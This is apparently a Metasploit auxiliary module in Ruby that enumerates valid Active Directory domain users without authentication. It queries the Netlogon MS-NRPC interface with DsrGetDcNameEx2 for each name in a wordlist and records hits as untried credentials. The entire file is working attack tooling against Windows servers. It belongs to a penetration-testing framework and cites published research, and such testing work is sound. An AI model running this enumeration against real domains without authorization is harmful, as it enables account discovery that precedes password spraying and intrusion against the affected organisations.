##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::DCERPC
  Netlogon = RubySMB::Dcerpc::Netlogon
  @dport = nil

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MS-NRPC Domain Users Enumeration',
        'Description' => %q{
          This module will enumerate valid Domain Users via no authentication against MS-NRPC interface.
          It calls DsrGetDcNameEx2 to check if the domain user account exists or not. It has been tested with
          Windows servers 2012, 2016, 2019 and 2022.
        },
        'Author' => [
          'Haidar Kabibo <https://x.com/haider_kabibo>'
        ],
        'References' => [
          ['URL', 'https://github.com/klsecservices/Publications/blob/master/A_journey_into_forgotten_Null_Session_and_MS-RPC_interfaces.pdf']
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
    register_options(
      [
        OptPort.new('RPORT', [false, 'The netlogon RPC port']),
        OptPath.new('USER_FILE', [true, 'Path to the file containing the list of usernames to enumerate']),
        OptBool.new('DB_ALL_USERS', [ false, 'Add all enumerated usernames to the database', false ])
      ]
    )
  end

  def bind_to_netlogon_service
    @dport = datastore['RPORT']
    if @dport.nil? || @dport == 0
      @dport = dcerpc_endpoint_find_tcp(datastore['RHOST'], Netlogon::UUID, '1.0', 'ncacn_ip_tcp')
      fail_with(Failure::NotFound, 'Could not determine the RPC port used by the Microsoft Netlogon Server') unless @dport
    end
    handle = dcerpc_handle(Netlogon::UUID, '1.0', 'ncacn_ip_tcp', [@dport])
    print_status("Binding to #{handle}...")
    dcerpc_bind(handle)
  end

  def dsr_get_dc_name_ex2(username)
    request = Netlogon.const_get('DsrGetDcNameEx2Request').new(
      computer_name: nil,
      account_name: username,
      allowable_account_control_bits: 0x200,
      domain_name: nil,
      domain_guid: nil,
      site_name: nil,
      flags: 0x00000000
    )
    begin
      raw_response = dcerpc.call(request.opnum, request.to_binary_s)
    rescue Rex::Proto::DCERPC::Exceptions::Fault
      fail_with(Failure::UnexpectedReply, "The Netlogon RPC request failed for username: #{username}")
    end
    Netlogon.const_get('DsrGetDcNameEx2Response').read(raw_response)
  end

  def report_username(domain, username)
    service_data = {
      address: datastore['RHOST'],
      port: @dport,
      service_name: 'netlogon',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: username,
      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
      realm_value: domain
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run_host(_ip)
    usernames = load_usernames(datastore['USER_FILE'])
    bind_to_netlogon_service

    usernames.each do |username|
      enumerate_user(username)
    end
  end

  private

  def load_usernames(file_path)
    unless ::File.exist?(file_path)
      fail_with(Failure::BadConfig, 'The specified USER_FILE does not exist')
    end

    usernames = []
    ::File.foreach(file_path) do |line|
      usernames << line.strip
    end
    usernames
  end

  def enumerate_user(username)
    response = dsr_get_dc_name_ex2(username)
    if response.error_status == 0
      print_good("#{username} exists -> DC: #{response.domain_controller_info.domain_controller_name.encode('UTF-8')}")
      if datastore['DB_ALL_USERS']
        report_username(response.domain_controller_info.domain_name.encode('UTF-8'), username)
      end
    else
      print_error("#{username} does not exist")
    end
  end
end
